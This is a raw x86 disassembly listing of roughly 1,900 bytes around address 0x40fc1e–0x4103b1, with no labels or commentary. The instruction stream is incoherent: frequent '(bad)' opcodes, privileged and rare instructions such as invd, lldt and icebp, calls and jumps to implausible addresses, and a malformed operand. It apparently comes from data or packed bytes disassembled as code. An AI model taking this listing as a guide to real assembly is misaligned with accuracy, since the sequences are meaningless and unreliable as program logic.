  40fc1e:	scas   eax,DWORD PTR es:[edi]
  40fc1f:	inc    ebp
  40fc20:	mov    esi,DWORD PTR [ebx]
  40fc22:	in     al,0x3
  40fc24:	add    al,0x89
  40fc26:	mov    ecx,DWORD PTR [eax+edi*8]
  40fc29:	dec    ebp
  40fc2a:	(bad)  
  40fc2b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3163]
  40fc32:	mov    ecx,eax
  40fc34:	cld    
  40fc35:	push   es
  40fc36:	dec    ebp
  40fc37:	add    al,0x33
  40fc39:	mov    DWORD PTR [ebx],eax
  40fc3b:	in     al,dx
  40fc3c:	cmp    DWORD PTR [ebp-0x67],eax
  40fc3f:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fc45:	mov    edx,DWORD PTR [ebp-0x4]
  40fc48:	mov    ecx,DWORD PTR [ebp-0x18]
  40fc4b:	xor    ecx,DWORD PTR [ebp+0x3]
  40fc4e:	cmp    DWORD PTR [ebx],0x8b32749c
  40fc54:	xor    edi,esp
  40fc56:	jmp    0xff74f9a8
  40fc5b:	add    ecx,DWORD PTR [ebp-0x3f]
  40fc5e:	xor    ebx,DWORD PTR [edi]
  40fc60:	add    eax,ecx
  40fc62:	cmp    ebx,DWORD PTR [eax]
  40fc64:	mov    ecx,DWORD PTR [ebp-0x4]
  40fc67:	mov    ecx,DWORD PTR [eax]
  40fc69:	adc    BYTE PTR [ebp-0x80],al
  40fc6c:	jmp    0x40fc6f
  40fc6e:	mov    eax,DWORD PTR [eax]
  40fc70:	cld    
  40fc71:	mov    bh,0xc6
  40fc73:	push   ecx
  40fc74:	(bad)  
  40fc75:	jne    0x40fcd5
  40fc77:	dec    ecx
  40fc79:	or     BYTE PTR [ecx+ebx*1],cl
  40fc7c:	push   ebp
  40fc7d:	inc    ebp
  40fc7e:	in     al,dx
  40fc7f:	add    ebp,esp
  40fc81:	or     bh,al
  40fc83:	dec    ebp
  40fc84:	cld    
  40fc85:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fc8b:	xor    DWORD PTR [edx],0x2
  40fc8e:	pushf  
  40fc8f:	dec    DWORD PTR [ebx+0x45510cf4]
  40fc95:	mov    DWORD PTR [ebx+0x5645fc0c],ecx
  40fc9b:	mov    edx,DWORD PTR [ecx+0xc]
  40fc9e:	xor    eax,esi
  40fca0:	mov    edx,0xc172c7
  40fca5:	inc    ebp
  40fca6:	mov    esi,DWORD PTR [ebp+0x8]
  40fca9:	mov    eax,edx
  40fcab:	call   0x84c5c3a0
  40fcb0:	add    DWORD PTR [ebp-0x76bace00],ebx
  40fcb6:	mov    ebp,eax
  40fcb8:	or     BYTE PTR [eax],dl
  40fcba:	jo     0x40fd09
  40fcbc:	push   edi
  40fcbd:	xor    esi,DWORD PTR [ebp+0x3]
  40fcc0:	(bad)  
  40fcc1:	pmulhuw mm0,mm1
  40fcc4:	test   DWORD PTR [ebp-0x8],ecx
  40fcc7:	mov    DWORD PTR [ebp-0x67],eax
  40fcca:	mov    eax,DWORD PTR [ebp-0x4]
  40fccd:	xor    edi,DWORD PTR [ebp-0x73]
  40fcd0:	xor    eax,DWORD PTR [ebx]
  40fcd2:	xor    esi,DWORD PTR [edx+0x3]
  40fcd5:	add    BYTE PTR [ecx],bh
  40fcd7:	inc    ebp
  40fcd8:	(bad)  
  40fcd9:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  40fcdf:	mov    DWORD PTR [eax],0x750f0004
  40fce5:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  40fceb:	lock add BYTE PTR [ebp+0x0],al
  40fcef:	mov    esi,DWORD PTR [ebp-0x2c]
  40fcf2:	mov    ebp,edx
  40fcf4:	or     al,0x72
  40fcf6:	ja     0x40fcf8
  40fcf8:	mov    edx,esi
  40fcfa:	cld    
  40fcfb:	(bad)  
  40fcfe:	cli    
  40fcff:	mov    esi,DWORD PTR [ebp-0x4]
  40fd02:	cmp    ecx,esi
  40fd04:	bswap  edi
  40fd06:	(bad)
  40fd0a:	mov    esi,DWORD PTR [ebp-0x4]
  40fd0d:	mov    esi,ecx
  40fd0f:	clc    
  40fd10:	repnz add esi,DWORD PTR [ebp+0x45]
  40fd14:	push   ebx
  40fd15:	xor    eax,DWORD PTR [ebp+0x3]
  40fd18:	xor    BYTE PTR [edi-0x64],bl
  40fd1b:	pop    ebx
  40fd1c:	jmp    0x40fde3
  40fd21:	mov    esi,DWORD PTR [ebp-0x7d]
  40fd24:	xor    ebp,DWORD PTR [eax]
  40fd26:	lea    eax,[ebp-0x8]
  40fd29:	xor    eax,0xc7ef9cf2
  40fd2e:	neg    eax
  40fd30:	ins    DWORD PTR es:[edi],dx
  40fd31:	test   esi,edi
  40fd33:	clc    
  40fd34:	pop    esp
  40fd35:	inc    ebp
  40fd36:	or     BYTE PTR [ecx+0x450f0c7d],cl
  40fd3c:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  40fd42:	add    cl,al
  40fd44:	jne    0x40fce3
  40fd46:	mov    esi,DWORD PTR [edx]
  40fd48:	in     al,dx
  40fd49:	push   esi
  40fd4a:	xor    BYTE PTR [ebp-0xe],dh
  40fd4d:	add    edi,esi
  40fd4f:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  40fd55:	add    cl,bh
  40fd57:	mov    edi,DWORD PTR [ebp+0x8]
  40fd5a:	mov    DWORD PTR [ebp-0x14],esi
  40fd5d:	add    esi,DWORD PTR [ebp+0x3c]
  40fd60:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  40fd66:	mov    ah,0x3e
  40fd68:	popf   
  40fd69:	pushf  
  40fd6a:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  40fd70:	jne    0x40fcfd
  40fd72:	mov    ecx,DWORD PTR [esp+ebp*8]
  40fd75:	icebp  
  40fd76:	icebp  
  40fd77:	shl    edx,0xf2
  40fd7a:	(bad)  
  40fd7b:	mov    ah,0x16
  40fd7d:	pusha  
  40fd7e:	jne    0x40fd13
  40fd80:	mov    ecx,DWORD PTR [edi]
  40fd82:	in     al,dx
  40fd83:	jmp    0x40fd76
  40fd85:	add    dl,dh
  40fd87:	mov    edi,esi
  40fd89:	or     al,0x8
  40fd8b:	inc    ebp
  40fd8c:	jne    0x40fd91
  40fd8e:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  40fd94:	ret    
  40fd95:	or     bh,bh
  40fd97:	jge    0x40fd81
  40fd99:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  40fd9f:	xor    edi,eax
  40fda1:	add    esi,DWORD PTR [ebp-0x77]
  40fda4:	mov    ebx,esp
  40fda6:	clc    
  40fda7:	neg    DWORD PTR [ebp-0x7c]
  40fdaa:	xor    eax,DWORD PTR [eax]
  40fdac:	cmp    eax,DWORD PTR [eax]
  40fdae:	repz jne 0x40fd46
  40fdb1:	xor    eax,DWORD PTR [ecx]
  40fdb3:	add    ebx,DWORD PTR [eax]
  40fdb5:	mov    DWORD PTR [ebp-0x8],eax
  40fdb8:	mov    eax,edi
  40fdba:	cld    
  40fdbb:	lock pop eax
  40fdbd:	test   DWORD PTR [ebx],esi
  40fdbf:	clc    
  40fdc0:	add    edx,DWORD PTR [edi-0x740bff77]
  40fdc6:	fdivp  st(4),st
  40fdc8:	test   ecx,esi
  40fdca:	(bad)  
  40fdcb:	jnp    0x40fdcc
  40fdcd:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  40fdd3:	jae    0x40fd60
  40fdd5:	sub    edi,esp
  40fdd7:	(bad)  
  40fdd8:	shl    DWORD PTR [eax-0x3e],0x89
  40fddc:	leave  
  40fddd:	call   0x8196b4ea
  40fde2:	in     al,dx
  40fde3:	(bad)  
  40fde4:	in     al,dx
  40fde5:	add    bh,al
  40fde7:	mov    esp,edi
  40fde9:	in     al,dx
  40fdea:	test   DWORD PTR [ebp-0x8],edi
  40fded:	mov    eax,DWORD PTR [ebp+0x2b]
  40fdf0:	xor    al,BYTE PTR [ebx]
  40fdf2:	pushf  
  40fdf3:	jnp    0x572ffa2c
  40fdf9:	xor    edx,DWORD PTR [esi-0x77]
  40fdfc:	push   ecx
  40fdfd:	loopne 0x40fe32
  40fdff:	jne    0x40fdbc
  40fe01:	mov    esi,DWORD PTR [edx-0x20]
  40fe04:	add    BYTE PTR [ebp-0x3d],bh
  40fe07:	xor    eax,DWORD PTR [ebp-0x73]
  40fe0a:	mov    edi,DWORD PTR [esi]
  40fe0c:	cld    
  40fe0d:	jb     0x40fdd5
  40fe0f:	add    bl,al
  40fe11:	jne    0x40fe58
  40fe13:	mov    edx,DWORD PTR [edi-0x10]
  40fe16:	jge    0x40fe95
  40fe18:	mov    esi,DWORD PTR [ebx]
  40fe1a:	lock add ecx,DWORD PTR [ebp+0x3b]
  40fe1e:	xor    esi,DWORD PTR [ebp-0x77]
  40fe21:	mov    esi,eax
  40fe23:	lock inc ebp
  40fe25:	jge    0x40fe5c
  40fe27:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  40fe2e:	dec    ebp
  40fe2f:	mov    esi,DWORD PTR [ebx]
  40fe31:	loopne 0x40fdbc
  40fe33:	jge    0x40fe2d
  40fe35:	add    DWORD PTR [ebp-0x7d],eax
  40fe38:	cmc    
  40fe39:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  40fe40:	dec    ebp
  40fe41:	hlt    
  40fe42:	xor    ebx,DWORD PTR [ebp-0x77]
  40fe45:	mov    esi,esp
  40fe47:	in     al,0x45
  40fe49:	jge    0x40fe7c
  40fe4b:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  40fe52:	dec    ebp
  40fe53:	xor    edx,DWORD PTR fs:[ebx+0x3ec7389]
  40fe5a:	inc    ebp
  40fe5b:	hlt    
  40fe5c:	xor    eax,0xb88b9f75
  40fe61:	add    al,0x95
  40fe63:	icebp  
  40fe64:	add    dl,dh
  40fe66:	mov    DWORD PTR [ebp+0x20],ebx
  40fe69:	cmp    eax,DWORD PTR [ebp+0xf]
  40fe6c:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fe70:	fistp  WORD PTR [ebx+0x0]
  40fe73:	inc    ebp
  40fe74:	mov    ebx,DWORD PTR [edi+0xc]
  40fe77:	add    eax,eax
  40fe79:	inc    ebp
  40fe7a:	test   BYTE PTR [ebx],dh
  40fe7c:	add    eax,DWORD PTR [ebx]
  40fe7e:	add    BYTE PTR [esi+0x45],bl
  40fe81:	ret    0x85
  40fe84:	jnp    0x54418253
  40fe8a:	inc    bp
  40fe8c:	inc    ebp
  40fe8d:	xor    eax,0xc78a9cb9
  40fe92:	add    ah,bl
  40fe94:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  40fe9a:	add    BYTE PTR [ebx+0x3],dl
  40fe9d:	mov    esi,0x708088b
  40fea2:	cmp    esi,eax
  40fea4:	setge  BYTE PTR [ecx-0x74fcffce]
  40feab:	mov    esp,edi
  40fead:	call   0x33cc43ff
  40feb2:	or     BYTE PTR [ebx],al
  40feb4:	inc    ecx
  40feb5:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40febb:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fec1:	lock add cl,al
  40fec4:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fecb:	mov    ch,0x45
  40fecd:	clc    
  40fece:	xor    eax,DWORD PTR [ebp+0x3]
  40fed1:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fed7:	inc    ebp
  40fed8:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fede:	mov    edi,eax
  40fee0:	mov    eax,DWORD PTR [ebp+0x3c]
  40fee3:	mov    ecx,DWORD PTR [eax]
  40fee5:	hlt    
  40fee6:	inc    ebp
  40fee7:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40feee:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fef4:	push   ebp
  40fef5:	mov    edi,DWORD PTR [ebx]
  40fef7:	in     al,dx
  40fef8:	jne    0x40febb
  40fefa:	mov    eax,DWORD PTR [ebp-0x28]
  40fefd:	add    DWORD PTR [eax],0xe8058dec
  40ff03:	clc    
  40ff04:	mov    eax,DWORD PTR [edi]
  40ff06:	clc    
  40ff07:	add    dh,dl
  40ff09:	rol    WORD PTR [ebp-0x1],cl
  40ff0d:	mov    edx,DWORD PTR [eax+0x8]
  40ff10:	jne    0x40fed2
  40ff12:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40ff19:	inc    ebp
  40ff1a:	push   esp
  40ff1b:	test   DWORD PTR [ecx+0xf],ecx
  40ff1e:	sub    edx,esp
  40ff20:	add    eax,DWORD PTR [eax]
  40ff22:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40ff28:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40ff2f:	mov    eax,DWORD PTR [ecx]
  40ff31:	and    BYTE PTR [eax],al
  40ff33:	inc    eax
  40ff34:	adc    BYTE PTR [eax],al
  40ff36:	inc    ebp
  40ff37:	inc    cx
  40ff3a:	push   esp
  40ff3b:	push   es
  40ff3c:	jne    0x40ff3e
  40ff3e:	push   edx
  40ff3f:	enterw 0xc1,0x4d
  40ff44:	mov    esp,DWORD PTR [esi+0x20]
  40ff47:	add    DWORD PTR [ecx-0x7b],eax
  40ff4a:	add    eax,DWORD PTR [ebx]
  40ff4c:	str    WORD PTR [eax+0x45]
  40ff50:	lea    ecx,[ebx+0x45890801]
  40ff56:	sbb    BYTE PTR [ebx],al
  40ff58:	dec    ebp
  40ff59:	cmp    al,0xf
  40ff5b:	inc    ebp
  40ff5c:	push   eax
  40ff5d:	mov    esi,DWORD PTR [ebx]
  40ff5f:	push   eax
  40ff60:	add    eax,eax
  40ff62:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40ff69:	inc    ebp
  40ff6a:	add    BYTE PTR ds:0x8b4d8c00,dh
  40ff70:	xor    edx,esp
  40ff72:	add    eax,esi
  40ff74:	mov    ebx,eax
  40ff76:	loopne 0x40ffbd
  40ff78:	dec    ebp
  40ff79:	mov    ecx,DWORD PTR [edi]
  40ff7b:	cld    
  40ff7c:	push   eax
  40ff7d:	xchg   DWORD PTR [ebx],esi
  40ff7f:	add    DWORD PTR [ebx],ebp
  40ff81:	add    BYTE PTR [ebx],ch
  40ff83:	or     BYTE PTR [ecx],bh
  40ff85:	dec    ecx
  40ff86:	loopne 0x40ff8b
  40ff88:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40ff8e:	push   ebp
  40ff8f:	add    DWORD PTR [ebx+0x55100800],eax
  40ff95:	dec    ebp
  40ff96:	jmp    0x40ff21
  40ff98:	mov    esp,DWORD PTR [eax]
  40ff9a:	sbb    dl,dl
  40ff9c:	inc    eax
  40ff9d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40ffa3:	add    BYTE PTR [ebx+0x74528555],cl
  40ffa9:	push   ebp
  40ffaa:	div    DWORD PTR [ebx]
  40ffac:	and    eax,DWORD PTR [ebx]
  40ffae:	add    edx,DWORD PTR [edx-0x30]
  40ffb1:	jno    0x40ff3e
  40ffb3:	inc    DWORD PTR [eax+eiz*1]
  40ffb6:	inc    ebp
  40ffb7:	push   eax
  40ffb8:	push   eax
  40ffb9:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40ffbf:	mov    edi,esp
  40ffc1:	push   eax
  40ffc2:	inc    ebp
  40ffc3:	enter  0x458b,0x8
  40ffc7:	push   ecx
  40ffc8:	(bad)  
  40ffc9:	call   0x10b09a1
  40ffce:	pop    ss
  40ffcf:	push   ebp
  40ffd0:	mov    ecx,DWORD PTR [ebx+0x489408]
  40ffd6:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40ffdc:	push   ecx
  40ffdd:	jo     0x40ffc7
  40ffdf:	inc    DWORD PTR [edi]
  40ffe1:	or     BYTE PTR [eax],al
  40ffe3:	call   0xcc072d
  40ffe8:	fmul   QWORD PTR [ebp+0x55]
  40ffeb:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fff1:	mov    bh,0x8c
  40fff3:	adc    al,0x9d
  40fff5:	dec    esp
  40fff6:	xor    bl,BYTE PTR [eax]
  40fff8:	mov    ecx,DWORD PTR [ebp+0xc]
  40fffb:	mov    eax,DWORD PTR [ebp-0x4]
  40fffe:	mov    esi,DWORD PTR [edi-0x3148f924]
  410004:	push   es
  410005:	retf   
  410006:	mov    BYTE PTR [ebp-0x30],0x3b
  41000a:	inc    ebp
  41000b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  410012:	retf   0x83fc
  410015:	into   
  410016:	dec    ebp
  410017:	retf   
  410018:	mov    ecx,DWORD PTR [ebp-0x74]
  41001b:	mov    eax,DWORD PTR [eax]
  41001d:	fdiv   QWORD PTR [ebx]
  41001f:	mov    bh,0x3
  410021:	push   es
  410022:	mov    esi,ecx
  410024:	sbb    cl,dl
  410026:	dec    ebp
  410027:	sar    DWORD PTR [ebx],cl
  410029:	push   ebp
  41002a:	jne    0x41003b
  41002c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  410032:	lea    ebx,[eax]
  410034:	call   0xf4ca8bfb
  410039:	sbb    dh,dl
  41003b:	add    edx,ebx
  41003d:	push   ebp
  41003e:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  410044:	push   ecx
  410045:	mov    DWORD PTR [eax-0x30],edx
  410048:	test   DWORD PTR [edx],eax
  41004a:	xadd   esp,esi
  41004d:	pop    es
  41004e:	add    cl,dl
  410050:	mov    eax,ecx
  410052:	or     al,0x45
  410054:	(bad)  
  410055:	push   eax
  410056:	add    DWORD PTR [edx+0x0],eax
  410059:	add    ecx,DWORD PTR [ecx]
  41005b:	and    dh,cl
  41005d:	call   0xc5092d
  410062:	add    DWORD PTR [ebp+0x0],edx
  410065:	mov    esp,DWORD PTR [ebp+0x18]
  410068:	add    BYTE PTR [eax+0x28],cl
  41006b:	xor    eax,DWORD PTR [eax]
  41006d:	add    esp,DWORD PTR [esi+0x3b]
  410070:	inc    ebp
  410071:	je     0x40fff6
  410073:	push   ecx
  410074:	push   es
  410075:	dec    ebp
  410076:	mov    DWORD PTR [ebx],eax
  410078:	(bad)  
  410079:	or     al,0x1e
  41007b:	inc    eax
  41007c:	add    BYTE PTR [ebx],al
  41007e:	data16 and BYTE PTR [ebp+0x50],al
  410082:	sub    DWORD PTR [ecx],0x8
  410085:	add    BYTE PTR [ebp-0x75],ah
  410088:	add    BYTE PTR [eax],bl
  41008a:	enter  0x894d,0x8b
  41008e:	int3   
  41008f:	loopne 0x41004b
  410091:	rol    BYTE PTR [eax],0x33
  410094:	lea    cx,[ebp+0xa]
  410098:	data16 jb 0x4100e0
  41009b:	add    BYTE PTR [ebx+0x44890855],cl
  4100a1:	sbb    ah,al
  4100a3:	inc    ebp
  4100a4:	inc    eax
  4100a5:	lldt   WORD PTR [edx+0x66]
  4100a9:	xor    ecx,DWORD PTR [eax]
  4100ab:	sub    eax,DWORD PTR [esi]
  4100ad:	mov    eax,DWORD PTR [eax]
  4100af:	or     al,0x66
  4100b1:	ror    edx,cl
  4100b3:	dec    ebp
  4100b4:	inc    ebp
  4100b5:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4100bb:	cld    
  4100bc:	or     BYTE PTR [edi+0x4501dd],dl
  4100c2:	retf   0xe0ce
  4100c5:	retf   
  4100c6:	(bad)  
  4100c7:	dec    ebp
  4100c8:	mov    al,0x8b
  4100ca:	in     al,dx
  4100cb:	and    BYTE PTR [ebx],dh
  4100cd:	or     al,BYTE PTR [ebp+0x27]
  4100d0:	in     al,dx
  4100d1:	xchg   eax,esp
  4100d3:	add    edi,eax
  4100d5:	add    BYTE PTR [eax+0x3f52ed55],bh
  4100db:	push   ebp
  4100dc:	inc    ebp
  4100dd:	xor    edx,edx
  4100df:	add    esp,eax
  4100e1:	push   edx
  4100e2:	push   bp
  4100e4:	inc    ebp
  4100e5:	jmp    ecx
  4100e7:	push   esp
  4100e8:	(bad)  
  4100e9:	inc    edx
  4100eb:	sbb    al,0x33
  4100ed:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4100f4:	add    BYTE PTR [ebp+0x48],0x8b
  4100f8:	jmp    0xf98b:0x100041c8
  4100ff:	xor    esi,DWORD PTR [edx+0x3]
  410102:	mov    ecx,DWORD PTR [edi]
  410104:	fmul   DWORD PTR [edx]
  410106:	add    BYTE PTR [eax],al
  410108:	lea    eax,[ebx-0x4700273c]
  41010e:	add    al,0x4f
  410110:	pop    DWORD PTR [eax]
  410112:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  410118:	push   edx
  410119:	inc    WORD PTR [ebp+0x8]
  41011d:	mov    eax,0x514f4d
  410122:	(bad)
  410126:	add    al,al
  410128:	xor    DWORD PTR [ebx-0x74baf730],eax
  41012e:	test   DWORD PTR [esi+0x74],esp
  410131:	inc    ebp
  410132:	mov    DWORD PTR [eax+0xa4e08],edi
  410138:	add    BYTE PTR [ecx-0x76c435bb],cl
  41013e:	or     dh,cl
  410140:	or     eax,0x8b8d5045
  410145:	inc    ebp
  410146:	mov    WORD PTR [ecx+0x3b8a00],?
  41014c:	jne    0x410181
  41014e:	mov    edi,DWORD PTR [edx+0x8f3b18]
  410154:	add    DWORD PTR [ebx],eax
  410156:	add    bh,bh
  410158:	adc    DWORD PTR [eax],ecx
  41015a:	adc    DWORD PTR [ebp+0x55],edi
  41015d:	push   es
  41015e:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410164:	mov    ebp,DWORD PTR [eax+ebp*1+0x503411d2]
  41016b:	inc    ebp
  41016c:	mov    edx,edi
  41016e:	or     al,0xd2
  410170:	push   eax
  410171:	(bad)  
  410172:	jne    0x410128
  410174:	call   0x28fa5b
  410179:	inc    ebp
  41017a:	shl    BYTE PTR [esp+eax*4],0xe0
  41017e:	add    bh,al
  410180:	add    BYTE PTR [ebp+esi*2-0x2c742e],bh
  410187:	(bad)  
  410188:	and    al,al
  41018a:	fs loope 0x41018c
  41018d:	inc    ebp
  41018e:	test   DWORD PTR [esi+0xf],edi
  410191:	leave  
  410192:	scas   al,BYTE PTR es:[edi]
  410193:	inc    esp
  410194:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41019b:	or     BYTE PTR [ebx-0x97717ca],0x83
  4101a2:	call   DWORD PTR [edi]
  4101a4:	shr    ah,0x84
  4101a7:	xchg   DWORD PTR [eax],eax
  4101a9:	add    DWORD PTR [eax],eax
  4101ab:	add    bh,bh
  4101ad:	dec    ebp
  4101ae:	and    BYTE PTR [ecx-0x38],dl
  4101b1:	push   eax
  4101b2:	dec    DWORD PTR [ebx+0xfd885]
  4101b8:	mov    BYTE PTR [ebp+0x508bac00],cl
  4101be:	mov    WORD PTR [ecx+0x0],ss
  4101c1:	lea    ecx,[ebx+0x108b20d8]
  4101c7:	mov    WORD PTR [edx],ds
  4101c9:	add    BYTE PTR [edi+0xff01ff],al
  4101cf:	mov    ecx,DWORD PTR [ebp-0x28]
  4101d2:	push   ecx
  4101d3:	shl    BYTE PTR [ebp+0x3a],0x8b
  4101d7:	inc    ebp
  4101d8:	in     al,0xeb
  4101da:	jno    0x410167
  4101dc:	push   edx
  4101dd:	mov    DWORD PTR [eax-0x28],edx
  4101e0:	mov    eax,DWORD PTR [ebp+0x20]
  4101e3:	je     0x41016c
  4101e5:	mov    eax,DWORD PTR [ecx]
  4101e7:	sbb    BYTE PTR [eax],al
  4101e9:	pop    DWORD PTR [eax]
  4101eb:	add    esi,eax
  4101ed:	add    bl,al
  4101ef:	adc    DWORD PTR [edi],esi
  4101f1:	jmp    0x8bcc5243
  4101f6:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  4101fd:	jne    0x41018a
  4101ff:	mov    ecx,DWORD PTR [eax]
  410201:	in     al,0x75
  410203:	pop    DWORD PTR [ecx+0x5601]
  410209:	push   edx
  41020a:	inc    DWORD PTR [ebx]
  41020c:	adc    BYTE PTR [ecx+0x45721cc6],cl
  410212:	add    BYTE PTR [edi+0x9],dl
  410215:	call   DWORD PTR [esi]
  410217:	and    dl,al
  410219:	and    bh,bh
  41021b:	inc    edi
  41021d:	test   eax,edx
  41021f:	sldt   ebx
  410222:	xor    al,BYTE PTR [eax]
  410224:	pushf  
  410225:	(bad)  
  410226:	jmp    0x410234
  410228:	mov    eax,edi
  41022a:	or     al,0x75
  41022c:	inc    eax
  41022d:	call   0x40f935
  410232:	mov    eax,eax
  410234:	loopne 0x4101ba
  410236:	inc    ebp
  410237:	add    BYTE PTR [ebx+0x1451c00],cl
  41023d:	mov    eax,DWORD PTR [ebp+0x20]
  410240:	add    edi,ecx
  410242:	add    BYTE PTR [eax],ch
  410244:	cmp    edi,0x18
  410247:	test   DWORD PTR [ebp+0xf],esi
  41024a:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  410251:	jne    0x410255
  410253:	call   0xff9ffd18
  410258:	leave  
  410259:	rcr    BYTE PTR [esp+eax*4],0x55
  41025d:	add    ah,ch
  41025f:	add    BYTE PTR [edi-0x48fef979],dh
  410265:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41026c:	inc    esp
  41026d:	mov    ebx,DWORD PTR [eax]
  41026f:	fcom   st(2)
  410271:	add    BYTE PTR [edi],bl
  410273:	lea    ecx,[eax-0x18]
  410276:	(bad)  
  410277:	push   DWORD PTR [ecx]
  410279:	call   0xffb34fdb
  41027e:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  410282:	fstp   DWORD PTR [esi+ebx*8]
  410285:	push   ebp
  410286:	pop    ebp
  410287:	mov    esi,DWORD PTR [edx-0x38]
  41028a:	add    DWORD PTR [eax],0x28
  41028d:	mov    edi,DWORD PTR [ebx]
  41028f:	xor    esi,DWORD PTR [edx+0x3]
  410292:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410296:	pop    ebp
  410297:	or     al,0x4
  410299:	inc    ecx
  41029a:	push   ebp
  41029b:	(bad)  
  41029c:	in     al,dx
  41029d:	or     ah,ch
  41029f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102a0:	xbegin 0xffc67896
  4102a6:	clc    
  4102a7:	adc    al,0x45
  4102a9:	div    BYTE PTR [edx]
  4102ab:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4102b2:	test   DWORD PTR [ebp+0x661b00f8],ebx
  4102b8:	add    BYTE PTR [ecx+0x66],dh
  4102bb:	add    eax,DWORD PTR [ebp+0x52]
  4102be:	adc    eax,0x60
  4102c1:	xchg   DWORD PTR [ecx+0x3400fc01],ecx
  4102c7:	test   DWORD PTR [eax],eax
  4102c9:	clc    
  4102ca:	data16 or al,BYTE PTR [ebp+0x45]
  4102ce:	or     DWORD PTR [ebx-0x3d76d720],0xfffffff8
  4102d5:	rol    BYTE PTR [ebp+0x45],1
  4102d8:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4102de:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4102e4:	push   ebx
  4102e5:	add    BYTE PTR [esi+0x0],dl
  4102e8:	push   ecx
  4102e9:	jge    0x41031e
  4102eb:	add    BYTE PTR [esi+0x4],dl
  4102ee:	jne    0x410355
  4102f0:	mov    edx,0x457200
  4102f5:	jmp    0x4102b9
  4102f7:	xor    edi,DWORD PTR [ebx]
  4102f9:	pop    edi
  4102fa:	cvtdq2ps xmm7,xmm0
  4102fd:	ret    0x0
  410300:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  410306:	xor    ecx,DWORD PTR [edi]
  410308:	add    eax,DWORD PTR [ecx+0x3b]
  41030b:	push   ebx
  41030c:	rdpmc  
  41030e:	out    0x8d,al
  410310:	add    BYTE PTR [eax],cl
  410312:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  410318:	ret    0x450c
  41031b:	sbb    al,0x8b
  41031d:	cmp    eax,esi
  41031f:	or     cl,al
  410321:	or     al,0xc2
  410323:	pop    eax
  410324:	inc    ebp
  410325:	add    ecx,DWORD PTR [edi]
  410327:	add    esi,DWORD PTR [ebp+0x39]
  41032a:	invd   
  41032c:	jge    0x410338
  41032e:	mov    eax,0x478ac0
  410333:	cli    
  410334:	xor    esp,ecx
  410336:	mov    ebx,0x5b8ac0
  41033b:	ret    0x33
  41033e:	mov    eax,0x833b8b
  410343:	sub    BYTE PTR [ebx],al
  410345:	inc    ebp
  410346:	xor    ax,0x9cf8
  41034a:	inc    bh
  41034c:	mov    esp,esp
  41034e:	hlt    
  41034f:	test   DWORD PTR [ebp-0x8],esi
  410352:	mov    eax,DWORD PTR [ebp-0x14]
  410355:	xor    ecx,DWORD PTR [ebx-0x76478864]
  41035b:	dec    edi
  41035c:	or     BYTE PTR [eax],al
  41035e:	jne    0x4102e9
  410360:	mov    esi,esp
  410362:	call   0x77a78f27
  410367:	inc    ebp
  410368:	mov    DWORD PTR [eax+0x9d4f0c],edi
  41036e:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410374:	add    BYTE PTR [esi+0x7d],ah
  410377:	inc    ebp
  410378:	mov    bx,WORD PTR [ebp+0x8]
  41037c:	add    DWORD PTR [ebp+0x56],0x30c008b
  410383:	inc    ebp
  410384:	mov    bx,di
  410387:	lock test BYTE PTR [ecx+0x7000801],bh
  41038e:	jge    0x410351
  410390:	mov    ecx,DWORD PTR [ebx-0x620613f0]
  410396:	cli    
  410397:	xor    bl,bh
  410399:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41039f:	test   BYTE PTR [eax],cl
  4103a1:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4103a8:	cmp    ebp,eax
  4103aa:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4103b1:	test   BYTE PTR [ebp+0x1],bh
